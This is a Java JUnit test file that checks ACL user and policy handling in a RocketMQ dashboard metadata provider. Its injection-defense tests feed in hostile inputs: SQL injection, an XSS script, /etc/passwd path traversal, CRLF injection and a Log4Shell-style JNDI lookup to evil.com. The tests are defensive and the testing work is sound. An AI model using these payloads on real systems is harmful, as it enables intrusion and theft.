/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.rocketmq.dashboard.architecture.impl;

import org.apache.rocketmq.dashboard.model.ACLPolicy;
import org.apache.rocketmq.dashboard.model.ACLUser;
import org.apache.rocketmq.tools.admin.MQAdminExt;
import org.junit.Before;
import org.junit.Test;

import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Optional;
import java.util.Set;

import static org.junit.Assert.*;
import static org.mockito.Mockito.mock;

/**
 * Security tests for V4MetadataProvider ACL operations.
 *
 * <p>Covers RIP-1 §8.5 (Security tests) requirements:
 * <ul>
 *   <li>ACL auth bypass prevention</li>
 *   <li>Parameter injection defense</li>
 *   <li>Input validation and sanitization</li>
 *   <li>Edge cases for user/policy management</li>
 * </ul>
 * </p>
 */
public class V4MetadataProviderSecurityTest {

    private V4MetadataProvider provider;
    private MQAdminExt mqAdminExt;

    @Before
    public void setUp() {
        mqAdminExt = mock(MQAdminExt.class);
        provider = new V4MetadataProvider(mqAdminExt);
    }

    // ==================== Input Validation ====================

    @Test(expected = IllegalArgumentException.class)
    public void testCreateACLUser_NullUser_ThrowsException() throws Exception {
        provider.createACLUser(null);
    }

    @Test(expected = IllegalArgumentException.class)
    public void testCreateACLUser_NullUsername_ThrowsException() throws Exception {
        ACLUser user = new ACLUser();
        user.setUserName(null);
        provider.createACLUser(user);
    }

    @Test(expected = IllegalArgumentException.class)
    public void testCreateACLUser_EmptyUsername_ThrowsException() throws Exception {
        ACLUser user = new ACLUser();
        user.setUserName("");
        provider.createACLUser(user);
    }

    @Test(expected = IllegalArgumentException.class)
    public void testCreateACLUser_BlankUsername_ThrowsException() throws Exception {
        ACLUser user = new ACLUser();
        user.setUserName("   ");
        provider.createACLUser(user);
    }

    @Test(expected = IllegalArgumentException.class)
    public void testCreateACLUser_DuplicateUsername_ThrowsException() throws Exception {
        ACLUser user = new ACLUser();
        user.setUserName("admin");
        provider.createACLUser(user);

        // Duplicate creation should fail
        ACLUser duplicate = new ACLUser();
        duplicate.setUserName("admin");
        provider.createACLUser(duplicate);
    }

    @Test(expected = IllegalArgumentException.class)
    public void testDeleteACLUser_NullUsername_ThrowsException() throws Exception {
        provider.deleteACLUser(null);
    }

    @Test(expected = IllegalArgumentException.class)
    public void testDeleteACLUser_EmptyUsername_ThrowsException() throws Exception {
        provider.deleteACLUser("");
    }

    @Test(expected = IllegalArgumentException.class)
    public void testDeleteACLUser_NonExistent_ThrowsException() throws Exception {
        provider.deleteACLUser("nonexistent");
    }

    // ==================== Privilege Escalation Prevention ====================

    @Test
    public void testCheckACLPermission_NullParameters_ReturnsFalse() throws Exception {
        assertFalse(provider.checkACLPermission(null, "topic:order", "read"));
        assertFalse(provider.checkACLPermission("user1", null, "read"));
        assertFalse(provider.checkACLPermission("user1", "topic:order", null));
    }

    @Test
    public void testCheckACLPermission_NonExistentUser_ReturnsFalse() throws Exception {
        assertFalse(provider.checkACLPermission("ghost", "topic:order", "read"));
    }

    @Test
    public void testCheckACLPermission_DenyPolicyOverridesAllow() throws Exception {
        // Create user
        ACLUser user = new ACLUser();
        user.setUserName("testuser");
        provider.createACLUser(user);

        // Create ALLOW policy
        ACLPolicy allowPolicy = new ACLPolicy();
        allowPolicy.setPolicyId("allow-1");
        allowPolicy.setPolicyType("ALLOW");
        allowPolicy.setUsers(new HashSet<>(Collections.singletonList("testuser")));
        allowPolicy.setResources(new HashSet<>(Collections.singletonList("topic:order")));
        allowPolicy.setActions(new HashSet<>(Arrays.asList("read", "write")));
        provider.addACLPolicy(allowPolicy);

        // Create DENY policy with higher precedence
        ACLPolicy denyPolicy = new ACLPolicy();
        denyPolicy.setPolicyId("deny-1");
        denyPolicy.setPolicyType("DENY");
        denyPolicy.setUsers(new HashSet<>(Collections.singletonList("testuser")));
        denyPolicy.setResources(new HashSet<>(Collections.singletonList("topic:order")));
        denyPolicy.setActions(new HashSet<>(Collections.singletonList("write")));
        provider.addACLPolicy(denyPolicy);

        // ALLOW should pass for read
        assertTrue("Read should be allowed", provider.checkACLPermission("testuser", "topic:order", "read"));

        // DENY should override ALLOW for write
        assertFalse("Write should be denied", provider.checkACLPermission("testuser", "topic:order", "write"));
    }

    // ==================== Parameter Injection Defense ====================

    @Test
    public void testCreateACLUser_UsernameWithSpecialCharacters_HandlesSafely() throws Exception {
        String[] specialUsernames = {
            "user'; DROP TABLE users; --",
            "user<script>alert('xss')</script>",
            "user../../../etc/passwd",
            "user\r\nInjectionHeader: value",
            "user\0nullbyte",
            "user${jndi:ldap://evil.com/exploit}",
        };

        for (String username : specialUsernames) {
            ACLUser user = new ACLUser();
            user.setUserName(username);
            provider.createACLUser(user);

            // Verify user was created safely (no crash, no exception)
            Optional<ACLUser> found = provider.getACLUser(username);
            assertTrue("User with special chars should be retrievable", found.isPresent());
            assertEquals(username, found.get().getUserName());
        }
    }

    @Test
    public void testAddACLPolicy_ResourcePatternInjection_HandlesSafely() throws Exception {
        ACLPolicy policy = new ACLPolicy();
        policy.setPolicyId("injection-test");
        policy.setUsers(new HashSet<>(Collections.singletonList("user1")));

        // Resource with SQL injection pattern
        Set<String> resources = new HashSet<>();
        resources.add("topic:order'; DROP TABLE policies; --");
        resources.add("../../../etc/passwd");
        policy.setResources(resources);

        Set<String> actions = new HashSet<>();
        actions.add("read'); INSERT INTO audit VALUES ('evil");
        policy.setActions(actions);

        // Should not throw
        provider.addACLPolicy(policy);

        List<ACLPolicy> policies = provider.listACLPolicies(null);
        assertEquals(1, policies.size());
    }

    @Test
    public void testCheckACLPermission_ResourceInjection_DoesNotBypass() throws Exception {
        ACLUser user = new ACLUser();
        user.setUserName("injectionuser");
        provider.createACLUser(user);

        ACLPolicy policy = new ACLPolicy();
        policy.setPolicyId("safe-policy");
        policy.setUsers(new HashSet<>(Collections.singletonList("injectionuser")));
        policy.setResources(new HashSet<>(Collections.singletonList("topic:order")));
        policy.setActions(new HashSet<>(Collections.singletonList("read")));
        provider.addACLPolicy(policy);

        // Attempt injection via resource parameter
        assertFalse("Injection should not bypass ACL",
            provider.checkACLPermission("injectionuser", "topic:order' OR '1'='1", "read"));
        assertFalse("Injection should not bypass ACL",
            provider.checkACLPermission("injectionuser", "topic:*'--", "read"));
    }

    // ==================== Wildcard Escalation Prevention ====================

    @Test
    public void testCheckACLPermission_WildcardAction_DeniesIfNotExplicitlyGranted() throws Exception {
        ACLUser user = new ACLUser();
        user.setUserName("limited");
        provider.createACLUser(user);

        ACLPolicy policy = new ACLPolicy();
        policy.setPolicyId("limited-policy");
        policy.setUsers(new HashSet<>(Collections.singletonList("limited")));
        policy.setResources(new HashSet<>(Collections.singletonList("topic:orders")));
        policy.setActions(new HashSet<>(Collections.singletonList("read")));  // Only "read", NOT "*"
        provider.addACLPolicy(policy);

        assertTrue("Read should be allowed", provider.checkACLPermission("limited", "topic:orders", "read"));
        assertFalse("Write should NOT be allowed (only read granted)",
            provider.checkACLPermission("limited", "topic:orders", "write"));
        assertFalse("Delete should NOT be allowed (only read granted)",
            provider.checkACLPermission("limited", "topic:orders", "delete"));
    }

    @Test
    public void testCheckACLPermission_WildcardResource_AppliesCorrectly() throws Exception {
        ACLUser user = new ACLUser();
        user.setUserName("global");
        provider.createACLUser(user);

        ACLPolicy policy = new ACLPolicy();
        policy.setPolicyId("global-policy");
        policy.setUsers(new HashSet<>(Collections.singletonList("global")));
        policy.setResources(new HashSet<>(Collections.singletonList("topic:*")));
        policy.setActions(new HashSet<>(Collections.singletonList("read")));
        provider.addACLPolicy(policy);

        assertTrue("Wildcard resource should match topic:orders",
            provider.checkACLPermission("global", "topic:orders", "read"));
        assertTrue("Wildcard resource should match topic:payments",
            provider.checkACLPermission("global", "topic:payments", "read"));
        assertFalse("Wildcard should not grant write",
            provider.checkACLPermission("global", "topic:orders", "write"));
    }

    // ==================== Policy Lifecycle Tests ====================

    @Test
    public void testDeletedUser_CannotAccessResources() throws Exception {
        ACLUser user = new ACLUser();
        user.setUserName("temporary");
        provider.createACLUser(user);

        ACLPolicy policy = new ACLPolicy();
        policy.setPolicyId("temp-policy");
        policy.setUsers(new HashSet<>(Collections.singletonList("temporary")));
        policy.setResources(new HashSet<>(Collections.singletonList("topic:temp")));
        policy.setActions(new HashSet<>(Arrays.asList("read", "write")));
        provider.addACLPolicy(policy);

        // Access works before deletion
        assertTrue(provider.checkACLPermission("temporary", "topic:temp", "read"));

        // Delete user
        provider.deleteACLUser("temporary");

        // Access fails after deletion
        assertFalse("Deleted user should not have access",
            provider.checkACLPermission("temporary", "topic:temp", "read"));
    }

    @Test
    public void testRemovedPolicy_DoesNotGrantAccess() throws Exception {
        ACLUser user = new ACLUser();
        user.setUserName("revoked");
        provider.createACLUser(user);

        ACLPolicy policy = new ACLPolicy();
        policy.setPolicyId("revocable");
        policy.setUsers(new HashSet<>(Collections.singletonList("revoked")));
        policy.setResources(new HashSet<>(Collections.singletonList("topic:revocable")));
        policy.setActions(new HashSet<>(Collections.singletonList("read")));
        provider.addACLPolicy(policy);

        assertTrue(provider.checkACLPermission("revoked", "topic:revocable", "read"));

        // Remove policy
        provider.removeACLPolicy(null, "revocable");

        assertFalse("Removed policy should not grant access",
            provider.checkACLPermission("revoked", "topic:revocable", "read"));
    }

    @Test
    public void testDeleteUser_RemovesAssociatedPolicies() throws Exception {
        ACLUser user = new ACLUser();
        user.setUserName("removable");
        provider.createACLUser(user);

        ACLPolicy policy = new ACLPolicy();
        policy.setPolicyId("orphan-policy");
        policy.setUsers(new HashSet<>(Collections.singletonList("removable")));
        policy.setResources(new HashSet<>(Collections.singletonList("topic:orphan")));
        policy.setActions(new HashSet<>(Collections.singletonList("read")));
        provider.addACLPolicy(policy);

        assertEquals(1, provider.listACLPolicies(null).size());

        // Delete user should clean up policies
        provider.deleteACLUser("removable");

        // Policy user list should be cleaned
        List<ACLPolicy> remaining = provider.listACLPolicies(null);
        for (ACLPolicy p : remaining) {
            assertFalse("Policy should not reference deleted user",
                p.getUsers() != null && p.getUsers().contains("removable"));
        }
    }

    // ==================== Username Concurrency Tests ====================

    @Test
    public void testListACLUsers_ReturnsAllCreatedUsers() throws Exception {
        assertEquals(0, provider.listACLUsers().size());

        for (int i = 0; i < 5; i++) {
            ACLUser user = new ACLUser();
            user.setUserName("user-" + i);
            provider.createACLUser(user);
        }

        assertEquals(5, provider.listACLUsers().size());
    }

    @Test
    public void testUpdateACLUser_PreservesIdentity() throws Exception {
        ACLUser original = new ACLUser();
        original.setUserName("updatable");
        original.setUserType("USER");
        provider.createACLUser(original);

        ACLUser updated = new ACLUser();
        updated.setUserName("updatable");
        updated.setUserType("ADMIN");
        provider.updateACLUser(updated);

        Optional<ACLUser> found = provider.getACLUser("updatable");
        assertTrue(found.isPresent());
        assertEquals("ADMIN", found.get().getUserType());
    }

    @Test(expected = IllegalArgumentException.class)
    public void testUpdateACLUser_NonExistent_ThrowsException() throws Exception {
        ACLUser user = new ACLUser();
        user.setUserName("nonexistent");
        provider.updateACLUser(user);
    }
}
